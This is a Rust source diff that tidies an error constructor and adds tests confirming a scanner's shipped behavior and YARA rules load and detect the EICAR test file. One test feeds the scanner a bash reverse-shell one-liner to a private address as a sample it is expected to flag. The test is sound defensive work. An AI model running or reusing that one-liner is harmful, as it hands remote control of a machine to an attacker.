@@ -30,8 +30,48 @@ pub enum Error {
 
 impl Error {
     pub fn io(path: &Path, source: std::io::Error) -> Error {
-        Error::Io { path: path.to_path_buf(), source }
+        Error::Io {
+            path: path.to_path_buf(),
+            source,
+        }
     }
 }
 
 pub type Result<T> = std::result::Result<T, Error>;
+
+#[cfg(test)]
+mod shipped {
+    use std::path::PathBuf;
+    use std::time::Duration;
+
+    fn rules_root() -> PathBuf {
+        PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../rules")
+    }
+
+    #[test]
+    fn the_shipped_behavior_rules_are_valid() {
+        let set = crate::rule::RuleSet::load_dir(&rules_root().join("behavior")).unwrap();
+        assert!(set.rules.len() >= 10, "{} rules", set.rules.len());
+        assert!(set.rules.iter().all(|r| r.id.starts_with("SYN-B-")));
+    }
+
+    #[test]
+    fn the_shipped_yara_rules_compile_and_find_eicar() {
+        let y = crate::scan::Yara::load_dir(&rules_root().join("yara"), Duration::from_secs(5))
+            .unwrap();
+        let hits = y.scan_bytes(crate::scan::EICAR).unwrap();
+        assert_eq!(
+            hits.iter().map(|h| h.rule.as_str()).collect::<Vec<_>>(),
+            ["eicar_test_file"]
+        );
+        assert!(y
+            .scan_bytes(b"#!/bin/sh\nexec bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
+            .unwrap()
+            .iter()
+            .any(|h| h.rule == "reverse_shell_oneliner"));
+        assert!(y
+            .scan_bytes(b"#!/bin/sh\nset -e\nmake install\n")
+            .unwrap()
+            .is_empty());
+    }
+}
